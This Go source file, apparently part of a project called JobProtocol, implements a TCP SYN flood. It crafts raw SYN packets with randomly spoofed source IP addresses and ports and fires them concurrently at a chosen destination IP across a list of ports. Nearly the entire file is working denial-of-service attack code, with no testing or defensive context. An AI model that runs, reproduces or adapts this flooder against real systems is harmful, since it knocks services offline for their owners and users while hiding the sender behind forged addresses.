package jobs

import (
	"fmt"
	"math/rand"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	globals "github.com/prairir/JobProtocol/Globals"
	"golang.org/x/net/ipv4"
)

// generates a fake IP address
// returns string
func randIP() string {
	var fakeIP string
	fakeIP += fmt.Sprint(rand.Intn(255)) + "."
	fakeIP += fmt.Sprint(rand.Intn(255)) + "."
	fakeIP += fmt.Sprint(rand.Intn(255)) + "."
	fakeIP += fmt.Sprint(rand.Intn(255))
	return fakeIP
}

// makes the TCP SYN packet with a spoofed source IP and source port
// returns net/ipv4 header and bytes of tcp packet
func tcpMakePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
	// the IP packet
	ipPacket := layers.IPv4{
		SrcIP:    net.ParseIP(randIP()),
		DstIP:    destIP,
		Version:  4,
		TTL:      255,
		Protocol: layers.IPProtocolTCP,
	}

	destPort := layers.TCPPort(destPortSrc)
	srcPort := layers.TCPPort(rand.Intn(65535)) // 2^16 possible ports

	// tcp syn packet
	tcpPacket := layers.TCP{
		SrcPort: srcPort,
		DstPort: destPort,
		Seq:     rand.Uint32(), // random sequence cause why not
		Window:  65535,
		Urgent:  0,
		Ack:     0,
		SYN:     true,
	}

	sOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// do the checksum at network layer
	tcpPacket.SetNetworkLayerForChecksum(&ipPacket)

	// ipHeader serialization
	ipHeaderBuffer := gopacket.NewSerializeBuffer()
	ipPacket.SerializeTo(ipHeaderBuffer, sOpts)

	ipHeader, err := ipv4.ParseHeader(ipHeaderBuffer.Bytes())
	if err != nil {
		tcpHandleErr(err)
	}

	tcpBuffer := gopacket.NewSerializeBuffer()

	gopacket.SerializeLayers(tcpBuffer, sOpts, &tcpPacket)

	return ipHeader, tcpBuffer.Bytes()
}

// TCPFlood runs a flood with TCP packets to destination IP for as many packets as given
func TCPFlood(destIPStr string, totalPacketToSend int) {
	// setting random seed
	rand.Seed(time.Now().UnixNano())

	destIP := net.ParseIP(destIPStr)
	tcpPorts := globals.GetTCPPorts()
	// loop as many times as given
	for packetCounter := 0; packetCounter < totalPacketToSend; packetCounter++ {
		// this can happen concurrently
		go func(tcpPorts []int, destIP net.IP) {
			// making the packet with a random port from list and dest IP
			ipHeader, packetBytes := tcpMakePacket(tcpPorts[rand.Intn(len(tcpPorts))], destIP)
			packetConn, err := net.ListenPacket("ip4:tcp", destIPStr)
			if err != nil {
				tcpHandleErr(err)
			}

			rawConn, err := ipv4.NewRawConn(packetConn)
			if err != nil {
				tcpHandleErr(err)
			}

			rawConn.WriteTo(ipHeader, packetBytes, nil)

			rawConn.Close()

		}(tcpPorts, destIP)
	}

}

func tcpHandleErr(message error) {
	fmt.Println("TCPFLOOD error: " + message.Error())
}
